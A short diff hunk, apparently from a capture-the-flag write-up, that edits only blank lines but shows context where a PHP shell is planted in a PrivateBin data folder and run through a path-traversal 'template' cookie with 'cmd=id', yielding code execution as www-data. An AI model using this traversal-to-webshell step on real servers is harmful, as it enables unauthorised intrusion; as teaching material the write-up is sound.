@@ -169,7 +169,8 @@ enumerate group operator, write a php shell inside /privatebin-data/data/bd/b5/ 
   `-b "template=../data/bd/b5/shell" \`
   `-G --data-urlencode "cmd=id"`
 `uid=65534(nobody) gid=82(www-data) groups=82(www-data)`
-                               
+
+
 
 ---
 ## Foothold
